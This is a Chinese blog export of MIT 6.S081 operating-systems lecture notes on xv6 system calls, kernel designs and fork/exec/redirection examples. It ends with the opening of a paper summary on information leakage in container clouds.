用户空间和内核空间的界限是一个硬性的界限，用户不能直接调用fork，用户的应用程序执行系统调用的唯一方法就是通过这里的ECALL指令。 假设我现在要执行另一个系统调用write，相应的流程是类似的，write系统调用不能直接调用内核中的write代码，而是由封装好的系统调用函数执行ECALL指令。所以write函数实际上调用的是ECALL指令，指令的参数是代表了write系统调用的数字。之后控制权到了syscall函数，syscall会实际调用write系统调用。 宏内核和微内核（Monolithic Kernel and Micro Kernel）现在，我们有了一种方法，可以通过系统调用或者说ECALL指令，将控制权从应用程序转到操作系统中。之后内核负责实现具体的功能并检查参数以确保不会被一些坏的参数所欺骗。所以内核有时候也被称为可被信任的计算空间（Trusted Computing Base），在一些安全的术语中也被称为TCB。 基本上来说，要被称为TCB，内核首先要是正确且没有Bug的。假设内核中有Bug，攻击者可能会利用那个Bug，并将这个Bug转变成漏洞，这个漏洞使得攻击者可以打破操作系统的隔离性并接管内核。所以内核真的是需要越少的Bug越好。 另一方面，内核必须要将用户应用程序或者进程当做是恶意的。内核的设计人员在编写和实现内核代码时，必须要有安全的思想。这个目标很难实现，因为当你的操作系统变得足够大的时候，很多事情就不是那么直观了。几乎每一个你用过的或者被广泛使用的操作系统，时不时的都有一个安全漏洞。就算被修复了，但是过了一段时间，又会出现一个新的漏洞。我们之后会介绍为什么很难让所有部分都正确工作，但是你要知道是内核需要做一些tricky的工作，需要操纵硬件，需要非常小心做检查，所以很容易就出现一些小的疏漏，进而触发一个Bug。这也是可以理解的。 宏内核（Monolithic Kernel）让整个操作系统代码都运行在kernel mode。大多数的Unix操作系统实现都运行在kernel mode。比如，XV6中，所有的操作系统服务都在kernel mode中，这种形式被称为Monolithic Kernel Design。 在一个宏内核中，任何一个操作系统的Bug都有可能成为漏洞。因为我们现在在内核中运行了一个巨大的操作系统，出现Bug的可能性更大了。你们可以去查一些统计信息，平均每3000行代码都会有几个Bug，所以如果有许多行代码运行在内核中，那么出现严重Bug的可能性也变得更大。所以从安全的角度来说，在内核中有大量的代码是宏内核的缺点。 如果你去看一个操作系统，它包含了各种各样的组成部分，比如说文件系统，虚拟内存，进程管理，这些都是操作系统内实现了特定功能的子模块。宏内核的优势在于，因为这些子模块现在都位于同一个程序中，它们可以紧密的集成在一起，这样的集成提供很好的性能。例如Linux，它就有很不错的性能。 微内核（Micro Kernel）在这种模式下，希望在kernel mode中运行尽可能少的代码。所以这种设计下还是有内核，但是内核只有非常少的几个模块，例如，内核通常会有一些IPC的实现或者是Message passing；非常少的虚拟内存的支持，可能只支持了page table；以及分时复用CPU的一些支持。 微内核的目的在于将大部分的操作系统运行在内核之外。所以，我们还是会有user mode以及user&#x2F;kernel mode的边界。但是我们现在会将原来在内核中的其他部分，作为普通的用户程序来运行。比如文件系统可能就是个常规的用户空间程序。 某种程度上来说，这是一种好的设计。因为在内核中的代码的数量较小，更少的代码意味着更少的Bug。 但是这种设计也有相应的问题。假设我们需要让Shell能与文件系统交互，比如Shell调用了exec，必须有种方式可以接入到文件系统中。通常来说，这里工作的方式是，Shell会通过内核中的IPC系统发送一条消息，内核会查看这条消息并发现这是给文件系统的消息，之后内核会把消息发送给文件系统。 文件系统会完成它的工作之后会向IPC系统发送回一条消息说，这是你的exec系统调用的结果，之后IPC系统再将这条消息发送给Shell。 所以，这里是典型的通过消息来实现传统的系统调用。现在，对于任何文件系统的交互，都需要分别完成2次用户空间&lt;-&gt;内核空间的跳转。与宏内核对比，在宏内核中如果一个应用程序需要与文件系统交互，只需要完成1次用户空间&lt;-&gt;内核空间的跳转，所以微内核的的跳转是宏内核的两倍。通常微内核的挑战在于性能更差，这里有两个方面需要考虑： 在user&#x2F;kernel mode反复跳转带来的性能损耗。 在一个类似宏内核的紧耦合系统，各个组成部分，例如文件系统和虚拟内存系统，可以很容易的共享page cache。而在微内核中，每个部分之间都很好的隔离开了，这种共享更难实现。进而导致更难在微内核中得到更高的性能。 在实际中，两种内核设计都会出现，出于历史原因大部分的桌面操作系统是宏内核，如果你运行需要大量内核计算的应用程序，例如在数据中心服务器上的操作系统，通常也是使用的宏内核，主要的原因是Linux提供了很好的性能。但是很多嵌入式系统，例如Minix，Cell，这些都是微内核设计。这两种设计都很流行，如果你从头开始写一个操作系统，你可能会从一个微内核设计开始。但是一旦你有了类似于Linux这样的宏内核设计，将它重写到一个微内核设计将会是巨大的工作。并且这样重构的动机也不足，因为人们总是想把时间花在实现新功能上，而不是重构他们的内核。 编译运行Kernel代码结构 kernel：里面包含了基本上所有的内核文件。因为XV6是一个宏内核结构，这里所有的文件会被编译成一个叫做kernel的二进制文件，然后这个二进制文件会被运行在kernle mode中。 user：这基本上是运行在user mode的程序。这也是为什么一个目录称为kernel，另一个目录称为user的原因。 mkfs：它会创建一个空的文件镜像，我们会将这个镜像存在磁盘上，这样我们就可以直接使用一个空的文件系统。 编译过程 Makefile（XV6目录下的文件）会读取一个C文件，例如proc.c；之后调用gcc编译器，生成一个文件叫做proc.s，这是RISC-V 汇编语言文件；之后再走到汇编解释器，生成proc.o，这是汇编语言的二进制格式。 Makefile会为所有内核文件做相同的操作，比如说pipe.c，会按照同样的套路，先经过gcc编译成pipe.s，再通过汇编解释器生成pipe.o。 之后，系统加载器（Loader）会收集所有的.o文件，将它们链接在一起，并生成内核文件。 这里生成的内核文件就是我们将会在QEMU中运行的文件。同时，为了你们的方便，Makefile还会创建kernel.asm，这里包含了内核的完整汇编语言，你们可以通过查看它来定位究竟是哪个指令导致了Bug。 传给QEMU的几个参数 kernel ：这里传递的是内核文件（kernel目录下的kernel文件），这是将在QEMU中运行的程序文件。 -m ：这里传递的是RISC-V虚拟机将会使用的内存数量。 smp：这里传递的是虚拟机可以使用的CPU核数 -drive：传递的是虚拟机使用的磁盘驱动，这里传入的是fs.img文件 QEMU直观来看，QEMU是一个大型的开源C程序，你可以下载或者git clone它。但是在内部，在QEMU的主循环中，只在做一件事情： 读取4字节或者8字节的RISC-V指令。 解析RISC-V指令，并找出对应的操作码（op code）。我们之前在看kernel.asm的时候，看过一些操作码的二进制版本。通过解析，或许可以知道这是一个ADD指令，或者是一个SUB指令。 之后，在软件中执行相应的指令。 这基本上就是QEMU的全部工作了，对于每个CPU核，QEMU都会运行这么一个循环。 XV6的启动过程QEMU 是一个通用的开源处理器模拟器和虚拟化程序，可以用于在物理计算机上模拟设备，并运行各种操作系统，如 xv6。以下是结合 QEMU 源代码和 xv6 源代码说明启动过程的概述： 启动 QEMU：从命令行启动 QEMU，并指定要加载的操作系统映像（在这种情况下为 xv6 操作系统）。命令可能如下所示： 1qemu-system-i386 -nographic -serial mon:stdio -hdb fs.img xv6.img -s -S 在这里，qemu-system-i386 是针对 x86（32 位）系统的 QEMU 模拟器，-nographic 参数表示不使用图形界面，-serial mon:stdio 表示将监视器（QEMU 控制台）连接到标准输入&#x2F;输出，-hdb fs.img 指定要加载的 xv6 文件系统映像，xv6.img 是 xv6 操作系统映像，-s 和 -S 参数用于调试。 QEMU 初始化虚拟硬件：QEMU 将根据所指定的参数和配置，初始化虚拟处理器、内存、硬盘和其他硬件设备。 加载引导程序：QEMU 模拟 BIOS 行为，将 xv6.img 映像中的启动扇区加载到内存中，并将控制权交给这段代码。在 xv6 的情况下，引导程序位于 bootasm.S（汇编代码）和 bootmain.c（C 代码）中。 引导程序运行：接下来的步骤与实际硬件上的启动过程相同。引导程序首先切换到保护模式，然后加载 ELF 格式的 xv6 内核映像到内存中。 进入 xv6 内核：引导程序找到 xv6 内核的入口点（在 kernel/entry.S 中），并将控制权交给内核。内核现在开始运行并执行初始化任务。 内核初始化：在 main.c 中的 main() 函数中，xv6 内核执行诸如设置分页、初始化中断控制器、初始化进程调度器等初始化任务。 创建初始进程：xv6 创建第一个内核进程（initcode.S），它是一个用户程序，负责启动其他用户进程。内核通过 fork() 系统调用创建新进程，并通过 exec() 系统调用加载并执行 initcode.S。 运行 init 进程：initcode.S 调用 init 程序（在 init.c 中），init 是一个用户空间程序，负责启动系统的第一个正常用户进程，通常是一个 shell 程序。在 xv6 中，这个程序是 sh.c。 运行 shell 程序：init 进程通过 fork() 和 exec() 创建并运行 shell 程序。这时，用户可以在 shell 中输入命令并与操作系统进行交互。","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"MIT6.S081 Operating System Engineering","slug":"课程学习/MIT6-S081-Operating-System-Engineering","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/MIT6-S081-Operating-System-Engineering/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT6.S081 Operating System Engineering Lecture01 Intrduction and Examples","slug":"MIT6-S081-Operating-System-Engineering-Lecture01-Intrduction-and-Examples","date":"2023-03-31T06:19:09.000Z","updated":"2023-04-06T07:00:08.730Z","comments":true,"path":"2023/03/31/MIT6-S081-Operating-System-Engineering-Lecture01-Intrduction-and-Examples/","link":"","permalink":"http://example.com/2023/03/31/MIT6-S081-Operating-System-Engineering-Lecture01-Intrduction-and-Examples/","excerpt":"简介课程目标 理解操作系统的设计和实现。理解整体结构和具体代码。 通过XV6操作系统获得实际动手经验。扩展操作系统，修改并提升操作系统的相关经验，并且能够通过操作系统接口，编写系统软件","text":"简介课程目标 理解操作系统的设计和实现。理解整体结构和具体代码。 通过XV6操作系统获得实际动手经验。扩展操作系统，修改并提升操作系统的相关经验，并且能够通过操作系统接口，编写系统软件 OS的目标 Abstract Hardware Multiplex Isolation Sharing Preformance Access Control&#x2F;Security Range Of Users OS的结构分层思想 Userspace在架构的最上层，运行各种各样的应用程序例如文本编辑器（VI），C编辑器（CC），作为CLI存在的shell。 Kernel区别于userspace，有一个特殊的程序总是会在运行。Kernel是计算机资源的守护者，当打开计算机时，Kernel总是第一个被启动。Kernel程序只有一个，维护数据来管理每一个用户空间进程。Kernel同时还维护了大量数据结构来帮助它管理各种各样的硬件资源，以供用户空间的程序使用。Kernel同时还会有大量内置的服务。例如，Kernel通常会有文件系统实现类似文件名，文件内容，目录的东西，并理解如何将文件存储在磁盘中。所以用户空间的程序会与Kernel中的文件系统交互，文件系统再与磁盘交互。 我们主要关注在Kernel、连接Kernal和用户空间程序的接口、Kernel内软件的架构 。所以我们会关心Kernel内的服务。其中一个是文件系统，另一个就是进程管理系统。 Manage Process：每一个用户空间程序都被称为一个进程，它们有自己的内存和共享的CPU时间。 Allocate Memory：Kernel会管理内存的分配，不同的进程需要不同数量的内存，Kernel会复用内存、划分内存，并为所有的进程分配内存。 File System：文件系统通常有一些逻辑分区。目前而言，我们可以认为文件系统的作用是管理文件内容并找出文件具体在磁盘中的哪个位置。文件系统还维护了一个独立的命名空间，其中每个文件都有文件名，并且命名空间中有一个层级的目录，每个目录包含了一些文件。所有这些都被文件系统所管理。 Security&#x2F;Access Control: 当一个进程想要使用某些资源时，比如读取磁盘中的数据，使用某些内存，Kernel中的Access Control机制会决定是否允许这样的操作。对于一个分时共享的计算机，例如Athena系统，这里可能会变得很复杂。因为在Athena系统中，每一个进程可能属于不同的用户，因此会有不同Access规则来约定哪些资源可以被访问。 在一个真实的完备的操作系统中，会有很多很多其他的服务，比如在不同进程之间通信的进程间通信服务，比如一大票与网络关联的软件（TCP&#x2F;IP协议栈），比如支持声卡的软件，比如支持数百种不同磁盘，不同网卡的驱动。所以在一个完备的系统中，Kernel会包含大量的内容，数百万行代码。 Kernel APIKernel API决定了应用程序如何访问Kernel。通常来说，这里通过系统调用System Call来完成。系统调用与程序中的函数调用看起来是一样的，但区别是系统调用会实际运行到系统内核中，并执行内核中对于系统调用的实现。 Kernel的代码总是有特殊的权限。当机器启动Kernel时，Kernel会有特殊的权限能直接访问各种各样的硬件，例如磁盘。而普通的用户程序是没有办法直接访问这些硬件的。所以，当你执行一个普通的函数调用时，你所调用的函数并没有对于硬件的特殊权限。然而，如果你触发系统调用到内核中，内核中的具体实现会具有这些特殊的权限，这样就能修改敏感的和被保护的硬件资源，比如访问硬件磁盘。 Example 112fd = open(&quot;out&quot;,1);write(fd,&quot;hello\\n&quot;,6); 第一个系统调用open，它会跳到Kernel，Kernel会获取到open的参数，执行一些实现了open的Kernel代码，或许会与磁盘有一些交互，最后返回一个文件描述符对象。上图中的fd全称就是file descriptor。之后应用程序可以使用这个文件描述符作为handle，来表示相应打开的文件。 第二个系统调用write，你需要向write传递一个由open返回的文件描述符作为参数。你还需要向write传递一个指向要写入数据的指针（数据通常是char型序列），在C语言中，可以简单传递一个双引号表示的字符串。第三个参数是你想要写入字符的数量。第二个参数的指针，实际上是内存中的地址。所以这里实际上告诉内核，将内存中这个地址起始的6个字节数据写入到fd对应的文件中。 Example 21pid = fork(); fork是一个系统调用，它创建了一个与调用进程一模一样的新的进程，并返回新进程的Process ID/PID。 这些系统调用看起来跟普通的函数调用一样，但是它最终会跳到系统内核中。 操作系统的难点 内核的编程环境比较困难。当你在编写、修改，扩展内核，或者写一个新的操作系统内核时，你实际上在提供一个基础设施让别人来运行他们的程序。当程序员在写普通的应用程序时，应用程序下面都是操作系统。而当我们在构建操作系统时，在操作系统下面就是硬件了，这些硬件通常会更难处理。 当你在设计一个操作系统时，你需要满足一些列矛盾的需求。 你想要你的操作系统既高效又易用。高效通常意味着操作系统需要在离硬件近的low-level进行操作，而易用则要求操作系统为应用程序提供抽象的high-level可移植接口。所以，提供一个简单可移植，同时又高效的抽象接口需要一定的技巧。 我们想要提供一个非常强大的操作系统服务，这样操作系统才能分担运行应用程序的负担。同时，我们也想要有简单的接口。我们不想程序员看到数量巨多，复杂且难以理解的的内核接口。因为，如果他们不理解这些接口，他们就会很难使用这些接口。 你希望给与应用程序尽可能多的灵活性，你不会想要限制应用程序，所以你需要内核具备灵活的接口。但是另一方面，你的确需要在某种程度上限制应用程序，因为你会想要安全性。我们希望给程序员完全的自由，但是实际上又不能是真正的完全自由，因为我们不想要程序员能直接访问到硬件，干扰到其他的应用程序，或者干扰操作系统的行为。 read，write，exit系统调用12345678910111213#inclued &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main()&#123; char buf[64]; while(1)&#123; int n = read(0,buf,sizeof(buf)); if(n &lt;= 0) break; write(1,buf,n); &#125; exit(0);&#125; read系统调用 第一个参数是文件描述符，实际上是对以前打开文件的引用。Shell会确保默认情况下，当一个程序启动时，文件描述符0为连接到console的输入，文件描述符1为连接到了console的输出。所以我们可以通过这个程序看到console打印我的输入。当然，这里的程序会预期文件描述符已经被Shell打开并设置好。 第二个参数是只想某段内存的指针，程序可以通过指针对应的地址读取内存中的数据，这里的指针就是代码中的buf参数。char buf[64]在栈中申请了64字节的内存，并将指针保存在buf中，这样read可以将数据保存在这64字节中。 第三个参数是代码想读取的最大长度。sizeof(buf)表示，最多读取64字节的数据，所以这里的read最多只能从连接到文件描述符0的设备，也就是console中，读取64字节的数据。 如果第三个参数是65字节，操作系统会拷贝65个字节到你提供的内存中（第二个参数）。但是如果栈中的第65个字节有一些其他数据，那么这些数据会被覆盖，这里是个bug，或许会导致你的代码崩溃，或者一些异常的行为。 read的返回值 可能是读到的字节数 如果从一个文件读数据，如果到达了文件的结尾没有更多的内容了，read会返回0。 如果出现了一些错误，比如文件描述符不存在，read或许会返回-1 。 write系统调用第一个参数为文件描述符，第二个参数是数据的指针，第三个参数是要写入的字节数 数据被写入到了文件描述符对应的文件中 open系统调用12345678#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;#include &quot;kernel/fcntl.h&quot;int main()&#123; int fd = open(&quot;output.txt&quot;,O_WRONLY | O_CREATE); write(fd, &quot;ooo\\n&quot;,4); exit(0);&#125; 这个程序会创建一个叫做output.txt的新文件，并向它写入一些数据，最后退出。我们看不到任何输出，因为它只是向打开的文件中写入数据，但是我们可以查看output.txt的内容，并看到open程序写入的“ooo”。 所以执行open系统调用，将out.txt作为参数传入，第二个参数是一些标志位，用来告诉open系统调用在内核中的实现，用来告诉open系统调用在内核中的实现：我们将要创建并写入一个文件。open系统调用会返回一个新分配的文件描述符，这里的文件描述符是一个小的数字，可能是2，3，4或者其他的数字。然后将文件描述符传入write中。 文件描述符本质上对应了内核中的一个表单数据。内核维护了每个运行进程的状态，内核会为每一个运行进程保存一个表单，表单的key是文件描述符。这个表单让内核知道，每个文件描述符对应的实际内容是什么。这里比较关键的点是，每个进程都有自己独立的文件描述符空间，所以如果运行了两个不同的程序，对应两个不同的进程，如果它们都打开一个文件，它们或许可以得到相同数字的文件描述符，但是因为内核为每个进程都维护了一个独立的文件描述符空间，这里相同数字的文件描述符可能会对应到不同的文件。 C语言与Python在文件描述符中的区别：Python提供了对与open调用的较好的封装，通常来说，Python提供的是更高级的函数，比如说Python不会使用指向内存的指针，并且Python会为你做更多的错误检查。当我们在Python中打开文件或者写入文件时，你在Python中的调用最终会走到跟我们例子中一样的系统调用。 ShellShell通常也是人们说的命令行接口。如果你还没有用过Shell，Shell是一种对于Unix系统管理来说非常有用的接口，它提供了很多工具来管理文件，编写程序，编写脚本。当你输入内容时，你是在告诉Shell运行相应的程序。 1ls ls的实际工作就是输出当前目录的文件列表 1ls &gt; out Shell允许重定向IO，这里的实际意义是要求Shell允许ls命令，但是将输出重定向到一个叫做out的文件中。这里执行完成之后我们看不到任何的输出，因为输出都送到了out文件。 1cat out 我们可以通过cat指令来读取一个文件，并显示文件的内容，之后我们可以看到ls指令相同的输出。 1grep x 你也可以运行一个名为grep的指令，并将x作为参数传给grep。 1grep x &lt; out grep x会搜索输入中包含x的行，我可以告诉shell将输入重定向到文件out，这样我们就可以查看out中的x。因为out文件包含了ls的输出，所以我们可以看出有3个文件名包含了x。 编译器如何处理系统调用？生成的汇编语言是不是会调用一些由操作系统定义的代码段？ 有一个特殊的RISC-V指令，程序可以调用这个指令，并将控制权交给内核。所以，实际上当你运行C语言并执行例如open或者write的系统调用时，从技术上来说，open是一个C函数，但是这个函数内的指令实际上是机器指令，也就是说我们调用的open函数并不是一个C语言函数，它是由汇编语言实现，组成这个系统调用的汇编语言实际上在RISC-V中被称为ecall。这个特殊的指令将控制权转给内核。之后内核检查进程的内存和寄存器，并确定相应的参数。 fork系统调用123456789101112#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main()&#123; int pid; pid = fork(); printf(&quot;fork() returned %d\\n&quot;,pid); if(pid == 0)&#123; printf(&quot;child\\n&quot;); &#125; else &#123; printf(&quot;parent\\n&quot;); &#125;&#125; fork会拷贝当前进程的内存，并创建一个新的进程，这里的内存包含了进程的指令和数据。之后我们就有了两个完全一样的内存的进程。fork系统调用在两个进程中都会返回，在原始的进程中，fork会返回大于0的整数，这个是新创建进程的ID。而在新创建的进程中，fork系统调用会返回0。所以即使两个进程的内存是完全一样的，我们还是可以通过fork的返回值区分旧进程和新进程。 返回 ffoorrkk(()) rreettuuttnende d 0 lc9h ilpda rent if（pid == 0），你可以看到代码检查pid。如果pid &#x3D; 0，这必然是子进程。在我们的例子中，调用进程通常称为父进程，父进程看到的pid必然大于0.所以父进程会打印“parent”,子进程会打印”child”。之后两个进程都会退出。 输出结果，实际发生二点是，fork系统调用之后，两个进程都在同时运行。它们会同时一个字节一个字节的输出，两个进程的输出交织在一起，所以你可以看到两个f，两个o等等。在第一行最后，你可以看到0，这是子进程的输出。 我猜父进程返回了19，作为子进程的进程ID。通常来说，这意味着这是操作系统启动之后的第19个进程。之后一个进程输出了child，一个进程输出了parent，这两个输出交织在一起。虽然这只是对于fork的一个简单应用，但是我们可以清晰的从输出看到这里创建了两个运行的进程，其中一个进程打印了child，另一个打印了parent。所以，fork（在子父进程中）返回不同的值是比较重要的。 父进程与子进程除了fork的返回值，两个进程是一样的。两个进程的指令是一样的，数据是一样的，栈是一样的，同时，两个进程又有各自独立的地址空间，它们都认为自己的内存从0开始增长，但这里是不同的内存。 在一个更加复杂的操作系统，有一些细节，我们现在并不关心，这些细节偶尔会导致父子进程不一致，但是在XV6中，父子进程除了fork的返回值，其他都是一样的。 除了内存是一样的以外，文件描述符的表单也从父进程拷贝到子进程。所以如果父进程打开了一个文件，子进程可以看到同一个文件描述符，尽管子进程看到的是一个文件描述符的表单的拷贝。除了拷贝内存以外，fork还会拷贝文件描述符表单。 exec，wait系统调用fork创建了一个新的进程。当我们在shell中运行东西的时候，shell实际上会创建一个新的进程来运行你输入的每一个指令。所以，当我输入ls时，我们需要shell通过fork创建一个进程来运行ls，这里需要某种方式来让这个新的进程来运行ls程序中的指令，加载名为ls的文件中的指令，也就是exec系统调用。 12345678910// exec.c:replace a process with an executable file#include &quot;kernel.types.h&quot;#include &quot;user/user.h&quot;int main()&#123; char *argv[] = &#123; &quot;echo&quot;, &quot;this&quot;, &quot;is&quot;, &quot;echo&quot;, 0 &#125;; exec(&quot;echo&quot;, argv); printf(&quot;exec failed!\\n&quot;); exit(0);&#125; 代码会执行exec系统调用，这个系统调用会从指定的文件中读取并加载指令，并替代当前调用进程的指令。从某种程度上来说，这样相当于丢弃了调用进程的内存，并开始执行新加载的指令。所以系统调用exec会有这样的效果：操作系统从名为echo的文件中加载指令到当前的进程中，并替换了当前进程的内存，之后开始执行这些新加载的指令。同时，你可以传入命令行参数，exec允许你传入一个命令行参数的数组，这里就是一个C语言中的指针数组，在上面代码设置好了一个字符指针的数组，这里的字符指针本质就是一个字符串（string） echo 程序是一个常见的命令行实用程序，用于在 Unix、Linux 和类 Unix 系统（如 macOS）上显示文本。它将传递给它的命令行参数（字符串）输出到标准输出（通常是终端或控制台）。echo 命令通常用于编写脚本或在控制台显示消息。 通过 exec(&quot;echo&quot;, argv); 系统调用执行。在这个例子中，argv 数组包含以下参数： 12345argv[0] = &quot;echo&quot;argv[1] = &quot;this&quot;argv[2] = &quot;is&quot;argv[3] = &quot;echo&quot;argv[4] = NULL (空指针) 通常，argv[0] 是程序名称（在这里是 “echo”），后面是实际要传递的命令行参数（在这里是 “this”, “is”, “echo”）。argv 数组以空指针（NULL）结尾，表示参数列表的结束。 当 echo 程序执行时，它会输出 &quot;this is echo&quot;。 exec系统调用会保留当前的文件描述符表单。所以任何在exec系统调用之前的文件描述符，例如0，1，2等。它们在新的程序中表示相同的东西。 通常来说exec系统调用不会返回，因为exec会完全替换当前进程的内存，相当于当前进程不复存在了，所以exec系统调用已经没有地方能返回了,在实例代码中，执行错误才会返回。 这就是一个程序如何用文件中的另一个程序来替代自己。实际上，当我们在Shell中运行类似于“echo a b c”的指令，或者ls，或者任何命令，我们不会想要代替Shell进程，所以我们不会希望Shell执行exec系统调用。如果我们这么做了，这里会用echo指令来替代Shell进程，当echo退出了，一切就结束了。所以我们不想要echo替代Shell。实际上，Shell会执行fork，之后fork出的子进程再调用exec系统调用，这是一个非常常见的Unix程序调用风格。对于那些想要运行程序，但是还希望能拿回控制权的场景，可以先执行fork系统调用，然后在子进程中调用exec。 1234567891011121314151617181920// forkexec.c: fork then exec#include &quot;user/user.h&quot;int main()&#123; int pid, status; pid = fork(); if(pid == 0) &#123; char *argv[] = &#123;&quot;echo&quot; ,&quot;THIS&quot; ,&quot;IS&quot; ,&quot;ECHO&quot;, 0 &#125;; exec(&quot;echo&quot;, argv); printf(&quot;exec failed!\\n&quot;); exit(1); &#125;else &#123; printf(&quot;parent waiting\\n&quot;); wait(&amp;status); printf(&quot;the child exited with status %d\\n&quot;,status); &#125; exit(0);&#125; fork系统调用会创建一个新的子进程，是当前进程的一个副本。 如果pid == 0，即进程是子进程，则会调用echo程序，输出&quot;THIS IS ECHO&quot;，如果错误则返回1。并且子进程在echo程序执行结束之后就会退出。，之后继续进行父进程。 父进程会先输出“parent waiting\\n”，之后使用wait系统调用，等待子进程返回，将子进程返回的状态传入status，&amp;status，是将status对应的地址传递给内核，内核会向这个地址写入子进程向exit传入的参数。 如果一个子进程退出成功了，那么exit的参数会是0，如果出现了错误，会向exit传入1。所以父进程读取的wait的参数取决于子进程是否成功的完成了。 I&#x2F;O Redirect1echo hello &gt; out Shell会将echo的输出送到文件out 1cat &lt; out 之后可以运行cat指令，并将out指令作为输入，之后保存在out文件中的内容就是echo指令的输出 Shell首先会先fork然后在子进程中，Shell改变了文件描述符。文件描述符1用来console输出，Shell会将文件描述符1改为output文件，之后再运行你的指令。同时，父进程的文件描述符1并没有改变。所以这里先fork再改变子进程的文件描述符。 123456789101112131415161718//redirect.c: run a command with output redirectedint main()&#123; int pid; pid = fork(); if(pid == 0) &#123; close(1); open(&quot;output.txt, O_WRONLY|O_CREATE&quot;); char *argv[] = &#123;&quot;echo&quot;, &quot;this&quot; ,&quot;is&quot; ,&quot;redirect&quot;, &quot;echo&quot;, 0 &#125;; exec(&quot;echo&quot;,argv); printf(&quot;exec failed!\\n&quot;) &#125; else &#123; wait((int *) 0); &#125;&#125; 在if(pid == 0)中，先检查pid的值，如果pid为0（在子进程中），则首先close(1),close(1)的意义是，我们希望文件描述符1指向一个其他的位置。也就是说，在子进程中我们不想使用原本指向console输出的文件描述符1，即关闭标准输出。 使用 open(&quot;output.txt&quot;, O_WRONLY | O_CREAT, 0666); 打开或创建名为 “output.txt” 的文件，以只写模式（O_WRONLY）打开，并设置创建模式（0666，表示所有用户都可以读写此文件）。这将使得新打开的文件描述符成为子进程的标准输出。 使用 exec(&quot;echo&quot;, argv); 系统调用，替换子进程的映像为 echo 程序，并传递 argv 参数列表。 如果 exec 调用失败，输出 “exec failed!”。 在父进程中，调用 wait((int *)0); 函数，等待子进程结束。 当运行此程序时，它将执行 echo 命令，并将输出 “this is redirect echo” 重定向到 “output.txt” 文件。如果文件已存在，它将覆盖现有内容；如果文件不存在，它将创建一个新文件。","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"MIT6.S081 Operating System Engineering","slug":"课程学习/MIT6-S081-Operating-System-Engineering","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/MIT6-S081-Operating-System-Engineering/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"论文阅读 A Study on the Security Implications of Information Leakages in Container Clouds","slug":"论文阅读 A-Study-on-the-Security-Implications-of-Information-Leakages-in-Container-Clouds","date":"2023-03-30T14:40:21.000Z","updated":"2023-04-15T05:07:00.036Z","comments":true,"path":"2023/03/30/论文阅读 A-Study-on-the-Security-Implications-of-Information-Leakages-in-Container-Clouds/","link":"","permalink":"http://example.com/2023/03/30/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%20A-Study-on-the-Security-Implications-of-Information-Leakages-in-Container-Clouds/","excerpt":"摘要Container technology提供了一个轻量级的操作系统虚拟主机环境。Container technology的出现深刻的改变了多层分布式应用的开发和部署范式（paradigms of multi-tier distributed applications）。然而，由于Linux系统内核中的系统资源隔离机制没有完全实现（system resource isolation mechanisms），在一个基于container的多租户云服务（multi-tenancy container-based cloud service）中，一些安全问题仍然存在。在本文，我们首先介绍了可以在containers内访问的信息泄露渠道。这些渠道暴露了一系列的系统范围的主机信息给没有适当资源分区的containers。通过利用泄露的主机信息，作为租户在container cloud中的恶意的攻击者就会更容易的发起可能影响云服务的可靠性的安全攻击。我们证明了信息泄露渠道将会被利用于推断隐私数据，检测和验证co-residence，建立隐蔽通道，发动更高级的基于云的攻击。我们讨论了container中的信息泄露的根本原因，并提出了一个两阶段的防御方法。正如评估中所证明的，我们的防御是有效的，并且性能开销非常小。 Introduction","text":"摘要Container technology提供了一个轻量级的操作系统虚拟主机环境。Container technology的出现深刻的改变了多层分布式应用的开发和部署范式（paradigms of multi-tier distributed applications）。然而，由于Linux系统内核中的系统资源隔离机制没有完全实现（system resource isolation mechanisms），在一个基于container的多租户云服务（multi-tenancy container-based cloud service）中，一些安全问题仍然存在。在本文，我们首先介绍了可以在containers内访问的信息泄露渠道。这些渠道暴露了一系列的系统范围的主机信息给没有适当资源分区的containers。通过利用泄露的主机信息，作为租户在container cloud中的恶意的攻击者就会更容易的发起可能影响云服务的可靠性的安全攻击。我们证明了信息泄露渠道将会被利用于推断隐私数据，检测和验证co-residence，建立隐蔽通道，发动更高级的基于云的攻击。我们讨论了container中的信息泄露的根本原因，并提出了一个两阶段的防御方法。正如评估中所证明的，我们的防御是有效的，并且性能开销非常小。 Introduction云计算已经广泛的运用于整合计算机资源。多租户是云计算的有利特征，允许来自不同租户的计算实例在同一物理服务器上运行。在不同类型的云服务中，多租户容器云最近作为传统的以云基础设施为基础的虚拟机VM的轻量级替代品出现。容器是一种OS级的虚拟化技术，在Linux内核中有多个building blocks，包括资源隔离&#x2F;控制技术（如namespace和cgroup）和安全机制（如Capabilities，SELinux，AppArmor和seccomp）。通过避免additional abstraction layers的开销，容器能够实现接近原生的性能，并且在几乎所有方面都超过了基于虚拟机的系统。除此之外，容器管理和orchestration系统的出现，如Docker和Kubernetes，深刻的改变了在云上构建、运输和部署多层分布式应用的生态系统。 